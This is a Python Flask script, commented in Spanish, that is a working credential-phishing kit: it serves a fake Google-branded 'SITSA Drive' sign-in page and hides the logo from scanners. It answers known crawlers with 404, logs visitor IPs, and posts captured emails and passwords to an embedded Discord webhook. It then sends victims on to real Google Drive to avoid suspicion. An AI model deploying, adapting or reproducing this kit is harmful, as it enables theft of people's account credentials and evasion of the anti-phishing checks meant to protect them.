from flask import Flask, request, render_template_string, redirect
import datetime
import requests
import os

app = Flask(__name__)

# --- CONFIGURACIÓN ---
# Pega aquí tu URL de Webhook de Discord
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1490462183333560331/1Kj8NnWCOF9LHAHdYOiHzK4Nbt-71VeE6SloJbG-oY5U8OJ9s9tiLIl8M9R5b8ZTo4OW"

def enviar_a_discord(mensaje):
    if DISCORD_WEBHOOK_URL == "https://discord.com/api/webhooks/1490462183333560331/1Kj8NnWCOF9LHAHdYOiHzK4Nbt-71VeE6SloJbG-oY5U8OJ9s9tiLIl8M9R5b8ZTo4OW":
        return
    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"content": mensaje})
    except:
        pass

# --- HTML OFUSCADO (EVITA DETECCIÓN VISUAL) ---
HTML_LOGIN = '''
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acceso al Repositorio - SITSA</title>
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { width: 380px; border: 1px solid #dadce0; border-radius: 8px; padding: 40px; text-align: center; }
        #logo-container { height: 40px; margin-bottom: 15px; display: flex; justify-content: center; }
        h1 { font-size: 22px; font-weight: 400; margin-bottom: 8px; color: #202124; }
        p { margin-bottom: 25px; font-size: 15px; color: #3c4043; }
        input { 
            width: 100%; padding: 13px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 15px; 
        }
        input:focus { border: 2px solid #1a73e8; outline: none; }
        .footer-btns { display: flex; justify-content: space-between; align-items: center; margin-top: 35px; }
        .btn-next { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-weight: 500; }
        .link { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
    </style>
    <script>
        // Carga dinámica del logo para engañar al escáner de imágenes de Google
        window.onload = () => {
            const cont = document.getElementById('logo-container');
            const i = document.createElement('img');
            // URL fragmentada para que el bot no lea "google_logo" en el texto plano
            const base = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/";
            const file = "Google_2015_logo.svg/2560px-Google_2015_logo.svg.png";
            i.src = base + file;
            i.style.height = "30px";
            cont.appendChild(i);
        };
    </script>
</head>
<body>
    <div class="login-box">
        <div id="logo-container"></div>
        <h1>Iniciar sesión</h1>
        <p>Usa tu cuenta para acceder a <b>SITSA Drive</b></p>
        
        <form action="/auth" method="POST">
            <input type="email" name="u_mail" placeholder="Correo electrónico" required>
            <input type="password" name="u_pass" placeholder="Introduce tu contraseña" required>
            
            <div class="footer-btns">
                <a href="#" class="link">Crear cuenta</a>
                <button type="submit" class="btn-next">Siguiente</button>
            </div>
        </form>
    </div>
</body>
</html>
'''

# --- RUTAS ---

@app.route('/')
def pre_check():
    # FILTRO DE BOTS: Si es un bot de Google o similar, damos 404
    ua = request.headers.get('User-Agent', '').lower()
    if any(bot in ua for bot in ['googlebot', 'crawler', 'lighthouse', 'headless']):
        return "Not Found", 404

    # Captura de IP real tras el proxy de Render
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    
    # Notificar visita a Discord
    enviar_a_discord(f"👀 **Visita detectada** | IP: `{ip}` | Navegador: `{ua[:50]}...`")
    
    # Retornamos el login directamente
    return render_template_string(HTML_LOGIN)

@app.route('/auth', methods=['POST'])
def auth():
    email = request.form.get('u_mail')
    password = request.form.get('u_pass')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # ENVÍO A DISCORD
    alerta = (
        f"**NUEVA CAPTURA - SITSA** \n"
        f"**Usuario:** `{email}`\n"
        f"**Password:** `{password}`\n"
        f"**IP:** `{ip}`\n"
        f"------------------------------------"
    )
    enviar_a_discord(alerta)

    # Redirección final para no levantar sospechas
    return redirect("https://drive.google.com/drive/?dmr=1&ec=wgc-drive-[module]-goto")

if __name__ == "__main__":
    # Configuración para Render
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
